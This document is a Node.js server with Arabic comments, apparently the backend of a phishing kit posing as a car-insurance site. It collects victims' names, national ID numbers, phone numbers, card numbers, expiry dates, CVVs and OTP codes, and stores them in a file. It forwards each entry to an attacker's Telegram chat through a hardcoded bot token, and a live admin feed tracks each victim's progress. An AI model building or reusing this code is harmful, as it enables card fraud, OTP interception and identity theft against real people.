const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs');
const path = require('path');
const cors = require('cors'); // تأكد من تثبيته: npm install cors node-fetch

const app = express();
const server = http.createServer(app);

// === إعدادات Telegram ===
const TELEGRAM_BOT_TOKEN = '7647127310:AAEL_VzCr1wTh26Exczu6IPnFgEsH4HHHVE'; // استبدل بقيمتك الحقيقية
const TELEGRAM_CHAT_ID = '6454807559'; // استبدل بقيمتك الحقيقية

/**
 * دالة لإرسال رسالة إلى Telegram
 * @param {string} message الرسالة المراد إرسالها
 * @returns {Promise<boolean>} True إذا تم الإرسال بنجاح، False بخلاف ذلك
 */
async function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML' // مهم جداً إذا كنت تستخدم وسوم HTML مثل <b>
    };

    try {
        // استخدام fetch API المدمج في Node.js 18+، أو تثبيت node-fetch للنسخ الأقدم
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        if (response.ok && result.ok) {
            console.log("Message sent to Telegram successfully.");
            return true;
        } else {
            console.error("Telegram API Error:", result.description || 'Unknown error', result);
            return false;
        }
    } catch (error) {
        console.error("Failed to send message to Telegram:", error);
        return false;
    }
}

// تهيئة Socket.IO مع CORS
const io = socketIo(server, {
    cors: {
        origin: "http://localhost:3000", // أو النطاق الذي يتم تشغيل الواجهة الأمامية عليه
        methods: ["GET", "POST"]
    }
});

// مسار ملف البيانات JSON
const DATA_FILE = path.join(__dirname, 'form_submissions.json');

// التأكد من وجود ملف البيانات
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, '[]', 'utf8');
    console.log('Created empty form_submissions.json file.');
}

// تهيئة CORS لطلبات HTTP العادية
app.use(cors({
    origin: "http://localhost:3000", // أو النطاق الذي يتم تشغيل الواجهة الأمامية عليه
    methods: ["GET", "POST"]
}));

// تمكين Express من قراءة JSON و URL-encoded bodies
app.use(express.json()); // لاستقبال JSON من طلبات Fetch - هذا هو الأهم لبياناتك
app.use(express.urlencoded({ extended: true })); // لاستقبال البيانات العادية (إذا احتجت لاحقاً)

// لخدمة الملفات الثابتة (مثل index.html, CSS, JS) من مجلد public
// تأكد من أن ملفاتك الأمامية (index.html, script.js, styleindex.css) موجودة داخل مجلد 'public'
app.use(express.static(path.join(__dirname, 'public')));


// دالة لقراءة البيانات
function readSubmissions() {
    try {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        const submissions = JSON.parse(data);
        if (submissions === null || !Array.isArray(submissions)) {
            console.error("Error decoding form_submissions.json. File might be corrupted or not an array. Initializing as empty array.");
            return []; // إرجاع مصفوفة فارغة إذا كان الملف تالفًا
        }
        return submissions;
    } catch (error) {
        console.error('Error reading data file:', error);
        if (error.code === 'ENOENT') { // إذا كان الملف غير موجود
            console.log('File form_submissions.json not found, creating a new one.');
            fs.writeFileSync(DATA_FILE, '[]', 'utf8');
            return [];
        }
        return [];
    }
}

// دالة لكتابة البيانات
function writeSubmissions(submissions) {
    try {
        // استخدام JSON_PRETTY_PRINT (indent 2) للحفاظ على قابلية القراءة
        fs.writeFileSync(DATA_FILE, JSON.stringify(submissions, null, 2), 'utf8');
        io.emit('data_updated', { data: submissions }); // إرسال تحديث عبر Socket.IO
        console.log('Data saved and broadcasted via Socket.IO.');
    } catch (error) {
        console.error('Error writing data file:', error);
    }
}

// ===============================================
// نقطة نهاية واحدة (Single Endpoint) لجميع عمليات النموذج
// ===============================================
app.post('/process_form_data', async (req, res) => {
    const formData = req.body; // البيانات ستكون هنا ككائن JSON بفضل app.use(express.json())
    const action = formData.action;
    let submissions = readSubmissions();
    let response = { status: 'error', message: 'طلب غير صالح.' };
    let updated = false;
    let id_number; // تعريف متغير id_number هنا ليكون متاحاً في كل حالات الـ switch

    switch (action) {
        case 'submit_initial_form':
            if (!formData.owner_name || !formData.id_number || !formData.phone) {
                response = { status: 'error', message: 'يرجى ملء الاسم، رقم الهوية، ورقم الهاتف.' };
                break;
            }

            id_number = formData.id_number; // استخدم id_number مباشرة من formData
            let foundIndex = -1;

            // البحث عن إدخال موجود بنفس رقم الهوية
            submissions.forEach((s, index) => {
                if (s.id_number && s.id_number === id_number) {
                    foundIndex = index;
                }
            });

            const new_submission_data = {
                owner_name: formData.owner_name,
                id_number: id_number,
                phone: formData.phone,
                // تأكد من أن 'purpose' يتم إرساله من الواجهة الأمامية بشكل صحيح
                purpose: formData.purpose || 'new_insurance', // قيمة افتراضية
                serial_number_form: formData.serial_number_form || '',
                manufacture_year: formData.manufacture_year || '',
                serial_number_custom: formData.serial_number_custom || '',
                status: 'pending', // الحالة الأولية
                submission_timestamp: new Date().toISOString(), // تنسيق ISO 8601
                geo_info: formData.geo_info || null, // من الكود السابق في index.html
                browser_info: formData.browser_info || null // من الكود السابق في index.html
            };

            let action_message;
            let telegram_prefix;

            if (foundIndex !== -1) {
                // دمج البيانات الموجودة مع البيانات الجديدة (تحديث)
                submissions[foundIndex] = { ...submissions[foundIndex], ...new_submission_data };
                action_message = 'تم تحديث بياناتك بنجاح.';
                telegram_prefix = `<b>تحديث بيانات عميل:</b> ${new_submission_data.owner_name || 'غير معروف'}\n\n`;
            } else {
                // إضافة إدخال جديد
                submissions.push(new_submission_data);
                action_message = 'تم استلام بياناتك بنجاح.';
                telegram_prefix = `<b>طلب جديد من عميل:</b> ${new_submission_data.owner_name || 'غير معروف'}\n\n`;
            }

            writeSubmissions(submissions); // حفظ البيانات وإرسالها عبر Socket.IO

            response = { status: 'success', message: action_message };

            // إرسال رسالة Telegram للطلب الأولي/التحديث
            const telegram_message_initial = telegram_prefix +
                `<b>الاسم:</b> ${new_submission_data.owner_name || 'غير متوفر'}\n` +
                `<b>رقم الهوية:</b> ${new_submission_data.id_number || 'غير متوفر'}\n` +
                `<b>الهاتف:</b> ${new_submission_data.phone || 'غير متوفر'}\n` +
                `<b>الغرض:</b> ${new_submission_data.purpose || 'غير متوفر'}\n` +
                `<b>تاريخ الإرسال:</b> ${new_submission_data.submission_timestamp || 'غير متوفر'}` +
                // إضافة حقول النوع المحدد فقط إذا كانت موجودة
                (new_submission_data.serial_number_form ? `\n<b>الرقم التسلسلي (استمارة):</b> ${new_submission_data.serial_number_form}` : '') +
                (new_submission_data.manufacture_year ? `\n<b>سنة الصنع:</b> ${new_submission_data.manufacture_year}` : '') +
                (new_submission_data.serial_number_custom ? `\n<b>الرقم التسلسلي (جمركية):</b> ${new_submission_data.serial_number_custom}` : '') +
                // إضافة معلومات الموقع والمتصفح إذا كانت متوفرة
                (new_submission_data.geo_info && new_submission_data.geo_info.city ? `\n<b>الموقع (المدينة):</b> ${new_submission_data.geo_info.city}` : '') +
                (new_submission_data.geo_info && new_submission_data.geo_info.country_name ? `\n<b>الموقع (الدولة):</b> ${new_submission_data.geo_info.country_name}` : '') +
                (new_submission_data.browser_info ? `\n<b>المتصفح:</b> ${new_submission_data.browser_info}` : '');
            
            await sendTelegramMessage(telegram_message_initial);
            break;

        case 'insurance_details':
            if (!formData.id_number) {
                response = { status: 'error', message: 'رقم الهوية مطلوب لحفظ تفاصيل التأمين.' };
                break;
            }
            id_number = formData.id_number;
            let currentSubmissionForInsurance = submissions.find(s => s.id_number === id_number);
            
            if (currentSubmissionForInsurance) {
                currentSubmissionForInsurance.insurance_details = {
                    insurance_type: formData.insurance_type || '',
                    start_date: formData.start_date || '',
                    usage_purpose: formData.usage_purpose || '',
                    car_value: formData.car_value || '',
                    manufacture_year: formData.manufacture_year || '',
                    repair_location: formData.repair_location || '',
                    timestamp: new Date().toISOString()
                };
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم حفظ تفاصيل التأمين بنجاح.' };
            } else {
                response = { status: 'error', message: 'رقم الهوية غير موجود لحفظ تفاصيل التأمين.' };
            }
            break;

        case 'save_payment_details':
            if (!formData.id_number) {
                response = { status: 'error', message: 'رقم الهوية مطلوب لحفظ تفاصيل الدفع.' };
                break;
            }
            id_number = formData.id_number;
            let currentSubmissionForPayment = submissions.find(s => s.id_number === id_number);

            if (currentSubmissionForPayment) {
                currentSubmissionForPayment.payment_details = {
                    payment_method: formData.payment_method || '',
                    total_amount: formData.total_amount || '',
                    timestamp: new Date().toISOString()
                };
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم حفظ تفاصيل الدفع بنجاح.' };
            } else {
                response = { status: 'error', message: 'رقم الهوية غير موجود لحفظ تفاصيل الدفع.' };
            }
            break;

        case 'save_card_details':
            if (!formData.id_number) {
                response = { status: 'error', message: 'رقم الهوية مطلوب لحفظ تفاصيل البطاقة.' };
                break;
            }
            id_number = formData.id_number;
            let userUpdated = false;
            let currentSubmissionForCard;

            submissions = submissions.map(s => {
                if (s.id_number === id_number) {
                    currentSubmissionForCard = s; // احتفظ بالمرجع للوصول إلى اسم العميل
                    s.card_details = {
                        card_name: formData.card_name || '',
                        card_number: formData.card_number || '',
                        expiry_date: formData.expiry_date || '',
                        cvv: formData.cvv || '',
                        timestamp: new Date().toISOString()
                    };
                    s.status = 'card_entered'; // تحديث الحالة إلى "تم إدخال البطاقة"
                    userUpdated = true;
                }
                return s;
            });

            if (userUpdated) {
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم حفظ تفاصيل البطاقة بنجاح.' };
                
                // إرسال رسالة Telegram لتفاصيل البطاقة
                if (currentSubmissionForCard) {
                    const telegram_message_card = `<b>🔴 تم تعبئة بيانات بطاقة لعميل:</b> ${currentSubmissionForCard.owner_name || 'غير معروف'}\n\n` +
                        `<b>رقم الهوية:</b> ${id_number || 'غير متوفر'}\n` +
                        `<b>رقم البطاقة:</b> ${formData.card_number || 'غير متوفر'}\n` + // انتبه: لا ترسل بيانات حساسة إلى Telegram في بيئة إنتاج حقيقية
                        `<b>تاريخ الانتهاء:</b> ${formData.expiry_date || 'غير متوفر'}\n` +
                        `<b>CVV:</b> ${formData.cvv || 'غير متوفر'}\n` + // انتبه: لا ترسل بيانات حساسة إلى Telegram في بيئة إنتاج حقيقية
                        `<b>وقت الإرسال:</b> ${currentSubmissionForCard.card_details.timestamp || 'غير متوفر'}\n` +
                        `<b>الحالة:</b> ${currentSubmissionForCard.status}`;
                    await sendTelegramMessage(telegram_message_card);
                }

            } else {
                response = { status: 'error', message: 'رقم الهوية غير موجود لحفظ تفاصيل البطاقة.' };
            }
            break;

        case 'save_otp':
            if (!formData.id_number || !formData.otp_code) {
                response = { status: 'error', message: 'رقم الهوية ورمز OTP مطلوبان لحفظ OTP.' };
                break;
            }
            id_number = formData.id_number;
            const otp_code = formData.otp_code;
            let userUpdatedOtp = false;
            let currentSubmissionForOtp;

            submissions = submissions.map(s => {
                if (s.id_number === id_number) {
                    currentSubmissionForOtp = s; // احتفظ بالمرجع للوصول إلى اسم العميل
                    if (!s.otp_attempts || !Array.isArray(s.otp_attempts)) {
                        s.otp_attempts = [];
                    }
                    s.otp_attempts.push({
                        otp_code: otp_code,
                        timestamp: new Date().toISOString()
                    });
                    s.status = 'otp_entered'; // تحديث الحالة إلى "تم إدخال OTP"
                    userUpdatedOtp = true;
                }
                return s;
            });

            if (userUpdatedOtp) {
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم حفظ رمز OTP بنجاح.' };

                // إرسال رسالة Telegram لرمز OTP
                if (currentSubmissionForOtp) {
                    const latestOtpAttempt = currentSubmissionForOtp.otp_attempts[currentSubmissionForOtp.otp_attempts.length - 1];
                    const telegram_message_otp = `<b>🚨 تم إدخال رمز OTP لعميل:</b> ${currentSubmissionForOtp.owner_name || 'غير معروف'}\n\n` +
                        `<b>رقم الهوية:</b> ${id_number || 'غير متوفر'}\n` +
                        `<b>رمز OTP:</b> ${latestOtpAttempt.otp_code || 'غير متوفر'}\n` + // انتبه: لا ترسل بيانات حساسة إلى Telegram في بيئة إنتاج حقيقية
                        `<b>وقت الإدخال:</b> ${latestOtpAttempt.timestamp || 'غير متوفر'}\n` +
                        `<b>الحالة:</b> ${currentSubmissionForOtp.status}`;
                    await sendTelegramMessage(telegram_message_otp);
                }

            } else {
                response = { status: 'error', message: 'رقم الهوية غير موجود لحفظ رمز OTP.' };
            }
            break;

        case 'update_status':
            if (!formData.id_number || !formData.status) {
                response = { status: 'error', message: 'رقم الهوية والحالة مطلوبان للتحديث.' };
                break;
            }
            id_number = formData.id_number;
            const new_status = formData.status;
            let submissionForStatusUpdate;
            submissions = submissions.map(s => {
                if (s.id_number === id_number) {
                    submissionForStatusUpdate = s; // احتفظ بالمرجع للوصول إلى اسم العميل
                    s.status = new_status;
                    updated = true;
                }
                return s;
            });

            if (updated) {
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم تحديث حالة المستخدم بنجاح.' };
                
                // يمكنك إضافة إرسال رسالة تيليجرام هنا إذا أردت إشعارًا عند تغيير الحالة يدوياً من لوحة المشرف
                // مثال:
                if (submissionForStatusUpdate) {
                   const telegram_message_status = `<b>✅ تم تحديث حالة العميل:</b> ${submissionForStatusUpdate.owner_name || 'غير معروف'}\n` +
                         `<b>رقم الهوية:</b> ${id_number}\n` +
                         `<b>الحالة الجديدة:</b> ${new_status}`;
                   await sendTelegramMessage(telegram_message_status);
                }
            } else {
                response = { status: 'error', message: 'رقم الهوية غير موجود لتحديث الحالة.' };
            }
            break;

        // يمكنك إضافة حالات إضافية هنا (مثل 'get_submission_data' لجلب بيانات عميل معين)
        // For example:
        case 'get_submission_data':
            if (!formData.id_number) {
                response = { status: 'error', message: 'رقم الهوية مطلوب لجلب البيانات.' };
                break;
            }
            id_number = formData.id_number;
            const record = submissions.find(s => s.id_number === id_number);
            if (record) {
                response = { status: 'success', message: 'تم جلب البيانات بنجاح.', data: record };
            } else {
                response = { status: 'error', message: 'لا توجد بيانات لهذا الرقم.' };
            }
            break;

        default:
            response = { status: 'error', message: 'إجراء غير معروف.' };
            break;
    }

    res.json(response);
});

// مسار لجلب جميع البيانات (للوحة المشرف مثلاً)
app.get('/admin/submissions', (req, res) => {
    try {
        const submissions = readSubmissions();
        res.json(submissions);
    } catch (error) {
        console.error("Error fetching submissions for admin:", error);
        res.status(500).json({ status: 'error', message: 'Failed to retrieve submissions.' });
    }
});

// مسار افتراضي لـ '/' لخدمة index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// استماع لـ Socket.IO Events
io.on('connection', (socket) => {
    console.log('مستخدم متصل عبر Socket.IO');

    // إرسال البيانات الحالية عند الاتصال
    socket.emit('data_updated', { data: readSubmissions() });

    socket.on('message', (msg) => {
        console.log('رسالة من العميل:', msg);
        io.emit('reply', 'تلقيت رسالتك: ' + msg);
    });

    socket.on('disconnect', () => {
        console.log('مستخدم قطع الاتصال عبر Socket.IO');
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Access frontend at: http://localhost:${PORT}`);
    console.log(`Access admin panel (data viewer): http://localhost:${PORT}/admin/submissions`);
});
